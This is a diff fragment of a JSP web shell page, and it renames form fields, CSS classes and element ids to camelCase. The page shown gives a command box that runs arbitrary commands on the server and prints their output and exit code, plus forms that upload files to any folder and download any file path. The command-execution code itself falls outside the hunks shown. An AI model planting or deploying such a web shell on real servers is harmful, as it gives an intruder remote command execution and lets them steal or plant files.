@@ -11,7 +11,7 @@
         return;
     }
 
-    String downloadFile = request.getParameter("download-file");
+    String downloadFile = request.getParameter("downloadFile");
     String downloadMsg = "";
     if(downloadFile != null && !downloadFile.trim().equals("")) {
         File f = new File(downloadFile);
@@ -68,9 +68,9 @@
                 Matcher m = Pattern.compile("; name=\"([^\"]*)\"(?:; filename=\"([^\"]*)\")?").matcher(contentDisposition);
                 m.find();
                 String paramName = m.group(1);
-                if(paramName.equals("upload-dir")) {
+                if(paramName.equals("uploadDir")) {
                     nextIsUploadDir = true;
-                } else if(paramName.equals("upload-files[]")) {
+                } else if(paramName.equals("uploadFiles[]")) {
                     nextIsFile = true;
                     fileName = m.group(2);
                     baos = new ByteArrayOutputStream();
@@ -141,23 +141,23 @@
             input[type=text] {
                 font-family: monospace;
             }
-            .cmd-box {
+            .cmdBox {
                 width: 80%;
             }
-            .info-line {
+            .infoText {
                 margin: 3px auto;
             }
-            .feature-box {
+            .featureBox {
                 margin: 1rem auto;
             }
         </style>
     </head>
     <body>
-        <form id="form-cmd" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmd-box" />
-            <input type="submit" name="submit-cmd" value="Run" />
+        <form id="cmdForm" method="POST" action="">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
+            <input type="submit" name="cmdSubmit" value="Run" />
         </form>
-        <div class="info-line">
+        <div class="infoText">
 <%
     if(shell != null) {
         out.println("Output of command <code>" + htmlEscape(shell) + " " + htmlEscape(shellOpt) + "</code> with argument: <code>" + htmlEscape(cmd) + "</code>");
@@ -166,35 +166,35 @@
     }
 %>
         </div>
-        <textarea readonly="readonly" rows="25" class="cmd-box">
+        <textarea readonly="readonly" rows="25" class="cmdBox">
 <%= htmlEscape(stdout.toString()) %>
         </textarea>
-        <div class="info-line">
+        <div class="infoText">
 <%
     if(exitCode != null) {
         out.println("Exit code: <code>" + exitCode + "</code>");
     }
 %>
         </div>
-        <div class="feature-box">
+        <div class="featureBox">
             <b>File Upload</b>
             <div>
 <%= uploadMsg %>
             </div>
             <form method="POST" action="" enctype="multipart/form-data">
-                <input type="text" name="upload-dir" placeholder="Destination folder" />
-                <input type="file" name="upload-files[]" multiple="multiple" />
-                <input type="submit" name="submit-upload" value="Upload" />
+                <input type="text" name="uploadDir" placeholder="Destination folder" />
+                <input type="file" name="uploadFiles[]" multiple="multiple" />
+                <input type="submit" name="uploadSubmit" value="Upload" />
             </form>
         </div>
-        <div class="feature-box">
+        <div class="featureBox">
             <b>File Download</b>
             <div>
 <%= downloadMsg %>
             </div>
             <form method="POST" action="">
-                <input type="text" name="download-file" placeholder="File to download" />
-                <input type="submit" name="submit-download" value="Download" />
+                <input type="text" name="downloadFile" placeholder="File to download" />
+                <input type="submit" name="downloadSubmit" value="Download" />
             </form>
         </div>
         <script>
@@ -228,7 +228,7 @@
                 shellHistory = new Array();
             }
             var historyPos = shellHistory.length;
-            document.getElementById("form-cmd").addEventListener("submit", saveHistory);
+            document.getElementById("cmdForm").addEventListener("submit", saveHistory);
             document.getElementById("cmd").addEventListener("keydown", cycleHistory);
         </script>
     </body>
